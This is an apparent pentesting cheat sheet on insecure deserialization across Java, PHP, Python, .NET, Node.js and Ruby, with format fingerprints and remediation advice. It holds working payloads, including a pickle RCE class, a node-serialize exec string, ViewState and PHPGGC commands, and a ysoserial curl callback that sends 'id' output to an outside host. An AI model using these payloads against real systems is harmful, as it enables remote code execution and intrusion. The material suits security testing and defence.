# Insecure Deserialization

Untrusted serialized data → object graph → unintended code execution via "magic method" or gadget chain.

## Fingerprint by format

| Prefix / pattern | Format |
|---|---|
| `rO0`                | Java `ObjectInputStream` (base64 of `AC ED 00 05`) |
| `\xac\xed`           | Java raw                     |
| `a:`, `O:`, `s:`     | PHP `serialize()`            |
| `gASV`               | Python pickle (base64)       |
| `\x80\x04`           | Python pickle protocol 4 raw |
| `TzoxNjoi`           | Base64 of PHP `O:16:"...` |
| `AAEAAAD/////`       | .NET `BinaryFormatter`       |
| `{"$type":"..."}`    | .NET Json.NET with TypeNameHandling |

Check cookies, hidden fields, API bodies, cache entries, session blobs, message queues.

## Java

Tools:
- [ysoserial](https://github.com/frohoff/ysoserial) — generate payloads against library gadgets (CommonsCollections 1-11, Spring, Hibernate, ROME, JSON-lib…).
- [ysoserial-modified](https://github.com/pwntester/ysoserial.net) — .NET equivalent.
- [marshalsec](https://github.com/mbechler/marshalsec) — beyond native: Jackson, SnakeYAML, XStream, BlazeDS, Kryo.

Quick test:
```bash
# Generate
java -jar ysoserial.jar CommonsCollections1 'curl https://oast.pro/$(id)' > payload.bin
base64 -w0 payload.bin
# Send as cookie / param
```

High-value sinks: RMI, JMX, LDAP (JNDI), Spring actuator `/jolokia`, Log4Shell-era JNDI injection.

## PHP

`unserialize()` on user input → wakeup / destruct chains.

```bash
# PHPGGC — gadget generator
phpggc Laravel/RCE9 system 'id' -u -b
```

Common chains: Laravel, Symfony, Drupal, Guzzle, Monolog, Slim.

Phar deserialization — any filesystem function called on `phar://evil.phar/test` triggers unserialize of phar metadata. Upload image with phar metadata.

## Python

pickle is RCE-by-design:
```python
import pickle, base64
class E:
    def __reduce__(self): return (__import__('os').system, ('id',))
print(base64.b64encode(pickle.dumps(E())))
```

Look for: session cookies using pickle, caches (memcache/redis) storing pickled objects, YAML with `yaml.load` (not `safe_load`).

Other dangerous loaders: `yaml.load`, `jsonpickle`, `marshal`, `shelve`.

## .NET

Sinks: `BinaryFormatter`, `NetDataContractSerializer`, `LosFormatter`, `SoapFormatter`, `ObjectStateFormatter` (ViewState!), `Json.NET` with `TypeNameHandling=Auto/All`.

Tool: `ysoserial.net`.

ViewState attack:
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c calc" \
  --path="/" --apppath="/" --validationalg="SHA1" --validationkey="<key>"
```

Leaked `machineKey` = full RCE on ASP.NET.

## Node.js

`node-serialize` `unserialize()` eval-s function stubs:
```
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id');}()"}
```

Also: `funcster`, `serialize-to-js`, template engines as gadgets.

## Ruby

Marshal.load on untrusted → gadget chains. ERB templates rendered from deserialized strings.

## Detection without RCE

Send distinctive payload that causes error / time delay / DNS callback:
- Java: ysoserial `URLDNS` gadget → DNS ping to Collaborator.
- .NET: TypeConfuseDelegate with `ping <collaborator>`.
- PHP: phpggc with sleep sink.

## Remediation

- Don't deserialize untrusted input. Use JSON/Protobuf with strict schemas.
- If required: sign + integrity-check blob before deserializing.
- Language-level: `safe_load`, `TypeNameHandling=None`, avoid `BinaryFormatter` (deprecated in .NET 5+).
- Runtime protections — Java `ObjectInputFilter`, .NET `ISerializationBinder`.

## References

- ysoserial — https://github.com/frohoff/ysoserial
- PHPGGC — https://github.com/ambionics/phpggc
- HackTricks deserialization — https://book.hacktricks.xyz/pentesting-web/deserialization
- Moritz Bechler "Java Unmarshaller Security" paper
